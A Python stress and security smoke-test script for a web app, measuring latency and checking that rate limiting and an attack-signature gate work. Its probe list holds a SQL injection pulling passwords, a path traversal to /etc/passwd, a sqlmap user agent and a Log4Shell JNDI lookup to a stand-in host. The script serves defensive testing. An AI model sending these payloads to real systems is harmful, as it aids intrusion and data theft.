"""IronPulse load & security smoke test (Windows / macOS / Linux - asyncio + httpx, no shell tools).

    python scripts/stress_test.py --base-url http://127.0.0.1:11000 --scenario mixed --concurrency 20 --requests 1000
    python scripts/stress_test.py --scenario public --duration 30 --max-p95-ms 800
    python scripts/stress_test.py --scenario security

Scenarios
  public    anonymous page views (home, gym directory, plans, jobs, legal pages, health check)
  api       JSON / plain endpoints (/healthz, /api/ai/status, /robots.txt)
  auth      the sign-in page + wrong-password sign-ins with a valid CSRF token (429s are expected: rate limit)
  security  checks the defences: a burst of sign-in attempts must hit the rate limit (429) and attack probes
            (SQL injection, path traversal, scanner user agent) must be blocked (403).
            WARNING: this deliberately trips the security gate, so the calling IP is BANNED afterwards (lift it in
            /superadmin/bans) - unless it is in RATE_LIMIT_WHITELIST, which also skips rate limits (no 429 then).
  mixed     weighted mix of public, api and sign-in page traffic

For heavy load tests add your IP to RATE_LIMIT_WHITELIST, otherwise the global limit (RATE_LIMIT_PER_MINUTE) answers
429 - which is correct behaviour, not a failure.

Exit code 0 = pass; 1 = any 5xx, transport errors above --max-error-rate, p95 above --max-p95-ms or a failed security
check; 2 = bad arguments. Tests import ``run()`` and drive the ASGI app in-process (``httpx.ASGITransport``).
"""

from __future__ import annotations

import argparse
import asyncio
import json
import math
import random
import re
import sys
import time
from collections import Counter
from dataclasses import dataclass, field
from typing import Any

import httpx

DEFAULT_BASE_URL = "http://127.0.0.1:10000"
USER_AGENT = "IronPulse-StressTest/1.0 (+scripts/stress_test.py)"
SCENARIOS = ("public", "api", "auth", "security", "mixed")
CSRF_META = re.compile(r'<meta name="csrf-token" content="([^"]+)"')

PUBLIC_PATHS = ("/", "/gyms", "/plans", "/jobs", "/about", "/terms", "/privacy", "/healthz")
API_PATHS = ("/healthz", "/api/ai/status", "/robots.txt")
LOGIN_PATH = "/auth/login"
RATE_LIMIT_BURST = 25

# (name, path, user agent override) - each must be answered with 403 by the security gate
ATTACK_PROBES: tuple[tuple[str, str, str | None], ...] = (
    ("SQL injection in the query string", "/gyms?q=1%27%20UNION%20SELECT%20password%20FROM%20users--", None),
    ("Path traversal to a system file", "/static/..%2f..%2f..%2fetc/passwd", None),
    ("Scanner user agent", "/", "sqlmap/1.7.2#stable (https://sqlmap.org)"),
    ("Log4Shell JNDI lookup", "/?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D", None),
)


@dataclass
class Config:
    base_url: str = DEFAULT_BASE_URL
    concurrency: int = 10
    requests: int | None = 200
    duration: float | None = None
    scenario: str = "mixed"
    max_p95_ms: float | None = None
    max_error_rate: float = 0.0
    timeout: float = 15.0
    seed: int | None = None
    verbose: bool = False
    json_output: bool = False


@dataclass
class Check:
    name: str
    ok: bool
    detail: str


@dataclass
class Result:
    scenario: str
    base_url: str
    elapsed: float = 0.0
    latencies_ms: list[float] = field(default_factory=list)
    statuses: Counter = field(default_factory=Counter)
    errors: Counter = field(default_factory=Counter)
    server_error_paths: Counter = field(default_factory=Counter)
    checks: list[Check] = field(default_factory=list)

    # ---------------------------------------------------------------- figures
    @property
    def completed(self) -> int:
        return len(self.latencies_ms)

    @property
    def total(self) -> int:
        return self.completed + sum(self.errors.values())

    @property
    def rps(self) -> float:
        return self.completed / self.elapsed if self.elapsed > 0 else 0.0

    @property
    def server_errors(self) -> int:
        return sum(n for code, n in self.statuses.items() if code >= 500)

    @property
    def error_rate(self) -> float:
        return sum(self.errors.values()) / self.total if self.total else 0.0

    def percentile(self, p: float) -> float:
        """Nearest-rank percentile of the response times (ms)."""
        if not self.latencies_ms:
            return 0.0
        ordered = sorted(self.latencies_ms)
        rank = max(1, math.ceil(p / 100.0 * len(ordered)))
        return ordered[min(rank, len(ordered)) - 1]

    def as_dict(self) -> dict[str, Any]:
        return {
            "scenario": self.scenario, "base_url": self.base_url, "requests": self.total, "completed": self.completed,
            "elapsed_s": round(self.elapsed, 3), "rps": round(self.rps, 1),
            "p50_ms": round(self.percentile(50), 1), "p95_ms": round(self.percentile(95), 1),
            "p99_ms": round(self.percentile(99), 1), "max_ms": round(max(self.latencies_ms, default=0.0), 1),
            "statuses": {str(k): v for k, v in sorted(self.statuses.items())}, "errors": dict(self.errors),
            "server_errors": self.server_errors, "server_error_paths": dict(self.server_error_paths),
            "checks": [{"name": c.name, "ok": c.ok, "detail": c.detail} for c in self.checks],
        }


# ===================================================================================== engine
class Runner:
    def __init__(self, cfg: Config, transport: httpx.AsyncBaseTransport | None = None) -> None:
        self.cfg = cfg
        self.transport = transport
        self.result = Result(cfg.scenario, cfg.base_url)
        self.rng = random.Random(cfg.seed)
        self._issued = 0
        self._deadline: float | None = None

    def client(self) -> httpx.AsyncClient:
        limits = httpx.Limits(max_connections=max(4, self.cfg.concurrency * 2),
                              max_keepalive_connections=max(2, self.cfg.concurrency))
        return httpx.AsyncClient(base_url=self.cfg.base_url, transport=self.transport, timeout=self.cfg.timeout,
                                 headers={"User-Agent": USER_AGENT}, follow_redirects=False, limits=limits)

    async def send(self, client: httpx.AsyncClient, method: str, path: str, **kwargs: Any) -> httpx.Response | None:
        started = time.perf_counter()
        try:
            resp = await client.request(method, path, **kwargs)
        except httpx.HTTPError as exc:
            self.result.errors[exc.__class__.__name__] += 1
            if self.cfg.verbose:
                print(f"  ! {method} {path}: {exc.__class__.__name__}", file=sys.stderr)
            return None
        self.result.latencies_ms.append((time.perf_counter() - started) * 1000)
        self.result.statuses[resp.status_code] += 1
        if resp.status_code >= 500:
            self.result.server_error_paths[f"{method} {path.split('?')[0]}"] += 1
        return resp

    def _next_ticket(self) -> bool:
        if self._deadline is not None:
            return time.perf_counter() < self._deadline
        if self.cfg.requests is None or self._issued >= self.cfg.requests:
            return False
        self._issued += 1
        return True

    # ---------------------------------------------------------------- per-scenario request
    async def _login_attempt(self, client: httpx.AsyncClient, state: dict[str, Any]) -> None:
        token = state.get("csrf")
        if not token:
            page = await self.send(client, "GET", LOGIN_PATH)
            match = CSRF_META.search(page.text) if page is not None and page.status_code == 200 else None
            state["csrf"] = token = match.group(1) if match else ""
            return
        await self.send(client, "POST", LOGIN_PATH, data={
            "identifier": f"stress-{self.rng.randrange(10**9)}@example.invalid", "password": "Wrong-password-123!",
            "csrf_token": token,
        })

    async def _one(self, client: httpx.AsyncClient, state: dict[str, Any]) -> None:
        scenario = self.cfg.scenario
        if scenario == "mixed":
            roll = self.rng.random()
            scenario = "public" if roll < 0.6 else ("api" if roll < 0.85 else "login_page")
        if scenario == "public":
            await self.send(client, "GET", self.rng.choice(PUBLIC_PATHS))
        elif scenario == "api":
            await self.send(client, "GET", self.rng.choice(API_PATHS))
        elif scenario == "login_page":
            await self.send(client, "GET", LOGIN_PATH)
        elif scenario == "auth":
            await self._login_attempt(client, state)

    async def _worker(self) -> None:
        state: dict[str, Any] = {}
        async with self.client() as client:
            while self._next_ticket():
                await self._one(client, state)

    async def load(self) -> None:
        if self.cfg.duration is not None:
            self._deadline = time.perf_counter() + self.cfg.duration
        await asyncio.gather(*(self._worker() for _ in range(max(1, self.cfg.concurrency))))

    # ---------------------------------------------------------------- security checks
    async def security_checks(self) -> None:
        async with self.client() as client:
            # 1) rate limiting: a burst of well-formed (valid CSRF token, unknown account) sign-ins must be throttled.
            #    Token-less POSTs would be rejected as CSRF attacks and get the caller banned before any 429.
            page = await self.send(client, "GET", LOGIN_PATH)
            match = CSRF_META.search(page.text) if page is not None and page.status_code == 200 else None
            token = match.group(1) if match else ""
            codes = []
            for i in range(RATE_LIMIT_BURST):
                resp = await self.send(client, "POST", LOGIN_PATH, data={
                    "identifier": f"burst-{i}-{self.rng.randrange(10**6)}@example.invalid", "password": "Wrong-password-123!",
                    "csrf_token": token,
                })
                codes.append(resp.status_code if resp is not None else 0)
                if resp is not None and resp.status_code == 429:
                    break
            limited = sum(1 for c in codes if c == 429)
            self.result.checks.append(Check(
                "Rate limiting answers 429", limited > 0,
                f"{limited} of {len(codes)} rapid sign-in attempts were throttled" if limited else
                f"no 429 in {len(codes)} rapid sign-in attempts - is this IP in RATE_LIMIT_WHITELIST "
                "or RATE_LIMIT_AUTH_PER_MINUTE set very high?",
            ))
            # 2) attack probes must be blocked by the signature scanner (or the ban they trigger)
            for name, path, agent in ATTACK_PROBES:
                headers = {"User-Agent": agent} if agent else None
                resp = await self.send(client, "GET", path, headers=headers)
                code = resp.status_code if resp is not None else 0
                self.result.checks.append(Check(f"Blocks: {name}", code == 403, f"HTTP {code or 'no response'}"))


async def run(cfg: Config, *, transport: httpx.AsyncBaseTransport | None = None) -> Result:
    """Run one scenario and return the measurements (used by the CLI and by the test-suite in-process)."""
    if cfg.scenario not in SCENARIOS:
        raise ValueError(f"unknown scenario {cfg.scenario!r}")
    runner = Runner(cfg, transport)
    started = time.perf_counter()
    if cfg.scenario == "security":
        await runner.security_checks()
    else:
        await runner.load()
    runner.result.elapsed = time.perf_counter() - started
    return runner.result


def failures(result: Result, cfg: Config) -> list[str]:
    problems = []
    if result.server_errors:
        problems.append(f"{result.server_errors} server error(s) (5xx)")
    if result.error_rate > cfg.max_error_rate:
        problems.append(f"transport error rate {result.error_rate:.1%} above {cfg.max_error_rate:.1%}")
    if cfg.max_p95_ms is not None and result.completed and result.percentile(95) > cfg.max_p95_ms:
        problems.append(f"p95 {result.percentile(95):.0f} ms above the {cfg.max_p95_ms:.0f} ms limit")
    problems += [f"security check failed: {c.name}" for c in result.checks if not c.ok]
    if not result.total:
        problems.append("no requests were made")
    return problems


def exit_code(result: Result, cfg: Config) -> int:
    return 1 if failures(result, cfg) else 0


def format_report(result: Result, cfg: Config) -> str:
    lines = [f"IronPulse stress test - scenario '{result.scenario}' against {result.base_url}"]
    lines.append(f"  requests     {result.total} ({sum(result.errors.values())} transport errors) in {result.elapsed:.2f} s"
                 f"  ->  {result.rps:.1f} req/s at concurrency {cfg.concurrency}")
    if result.completed:
        lines.append(f"  latency      p50 {result.percentile(50):.0f} ms | p95 {result.percentile(95):.0f} ms | "
                     f"p99 {result.percentile(99):.0f} ms | max {max(result.latencies_ms):.0f} ms")
    if result.statuses:
        lines.append("  statuses     " + "  ".join(f"{code} x{n}" for code, n in sorted(result.statuses.items())))
    if result.errors:
        lines.append("  errors       " + "  ".join(f"{name} x{n}" for name, n in result.errors.most_common()))
    for path, n in result.server_error_paths.most_common(8):
        lines.append(f"  5xx          {path} x{n}")
    if 429 in result.statuses and cfg.scenario != "security":
        lines.append("  note         429 = rate limited (expected unless this IP is in RATE_LIMIT_WHITELIST)")
    for c in result.checks:
        lines.append(f"  {'PASS' if c.ok else 'FAIL'}         {c.name}: {c.detail}")
    problems = failures(result, cfg)
    lines.append("  verdict      " + ("PASS" if not problems else "FAIL - " + "; ".join(problems)))
    return "\n".join(lines)


# ===================================================================================== CLI
def positive_int(value: str) -> int:
    n = int(value)
    if n < 1:
        raise argparse.ArgumentTypeError("must be at least 1")
    return n


def positive_float(value: str) -> float:
    n = float(value)
    if n <= 0:
        raise argparse.ArgumentTypeError("must be greater than 0")
    return n


def parse_args(argv: list[str] | None = None) -> Config:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--base-url", default=DEFAULT_BASE_URL, help=f"server to test (default {DEFAULT_BASE_URL})")
    ap.add_argument("--concurrency", type=positive_int, default=10, help="parallel virtual users (default 10)")
    group = ap.add_mutually_exclusive_group()
    group.add_argument("--requests", type=positive_int, default=None, help="total requests (default 200)")
    group.add_argument("--duration", type=positive_float, default=None, help="run for N seconds instead")
    ap.add_argument("--scenario", choices=SCENARIOS, default="mixed")
    ap.add_argument("--max-p95-ms", type=positive_float, default=None, help="fail when p95 latency is above this")
    ap.add_argument("--max-error-rate", type=float, default=0.0, help="tolerated share of transport errors (0-1)")
    ap.add_argument("--timeout", type=positive_float, default=15.0, help="per-request timeout in seconds")
    ap.add_argument("--seed", type=int, default=None, help="random seed (repeatable runs)")
    ap.add_argument("--json", action="store_true", help="print a JSON summary instead of the text report")
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args(argv)
    if not args.base_url.startswith(("http://", "https://")):
        ap.error("--base-url must start with http:// or https://")
    cfg = Config(base_url=args.base_url.rstrip("/"), concurrency=args.concurrency,
                 requests=None if args.duration else (args.requests or 200), duration=args.duration,
                 scenario=args.scenario, max_p95_ms=args.max_p95_ms, max_error_rate=max(0.0, min(1.0, args.max_error_rate)),
                 timeout=args.timeout, seed=args.seed, verbose=args.verbose, json_output=args.json)
    return cfg


def main(argv: list[str] | None = None) -> int:
    try:
        cfg = parse_args(argv)
    except SystemExit as exc:  # argparse already printed the message
        return int(exc.code or 0) if exc.code in (0, None) else 2
    if cfg.scenario == "security":
        print("WARNING: the security scenario trips the security gate on purpose - the calling IP will be banned "
              "(lift it in /superadmin/bans) unless it is in RATE_LIMIT_WHITELIST.", file=sys.stderr)
    result = asyncio.run(run(cfg))
    if cfg.json_output:
        print(json.dumps({**result.as_dict(), "pass": not failures(result, cfg), "problems": failures(result, cfg)}, indent=2))
    else:
        print(format_report(result, cfg))
    return exit_code(result, cfg)


if __name__ == "__main__":
    raise SystemExit(main())
